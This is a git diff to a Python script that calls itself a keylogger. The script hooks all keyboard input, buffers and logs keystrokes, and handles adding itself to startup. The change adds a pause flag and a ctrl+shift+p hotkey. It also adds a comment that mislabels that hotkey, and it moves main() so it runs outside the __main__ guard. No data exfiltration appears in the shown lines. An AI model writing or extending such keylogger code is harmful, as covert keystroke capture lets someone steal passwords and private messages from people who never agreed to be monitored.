@@ -27,6 +27,9 @@ dir_path = os.path.dirname(os.path.realpath(sys.argv[0]))
 # Config Dict
 config = {}
 
+# Paused logging
+paused = False
+
 # Read confgi from json file
 def read_config():
     if exists(CONFIG_FILE) and not os.stat(CONFIG_FILE).st_size == 0:
@@ -105,7 +108,11 @@ def log_it():
     return True
 
 def key_callback(event):
-    global line_buffer
+    global line_buffer, paused
+
+    # while paused no logging
+    if paused:
+        return True
 
     # event key up 
     if event.event_type == 'up':
@@ -132,9 +139,16 @@ def key_callback(event):
     log_it()
     return True  
 
-def main(): 
+def pause_logging():
+    global paused, line_buffer
+    line_buffer = line_buffer.removesuffix("P")
+    paused = not paused
+
+def main():
     keyboard.hook(key_callback)
-    # To Exit the Keylogger with safing the buffer (ctrl + tab + ende)
+    # To Pause the Keylogger (ctrl + shift + e)
+    keyboard.add_hotkey('ctrl+shift+p', pause_logging)
+    # To Exit the Keylogger with safing the buffer (ctrl + shift + e)
     keyboard.wait('ctrl+shift+e') 
     global line_buffer
     line_buffer = line_buffer.removesuffix("E")
@@ -154,4 +168,4 @@ if __name__ == '__main__':
     else: 
         remove_from_startup()
 
-    main()
+main()
